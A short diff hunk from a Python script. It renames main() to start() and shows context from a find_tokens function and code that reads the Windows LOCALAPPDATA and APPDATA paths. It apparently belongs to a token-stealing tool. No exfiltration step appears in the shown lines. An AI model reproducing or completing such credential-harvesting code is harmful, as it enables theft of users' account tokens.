@@ -25,7 +25,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-def main():
+def start():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
 
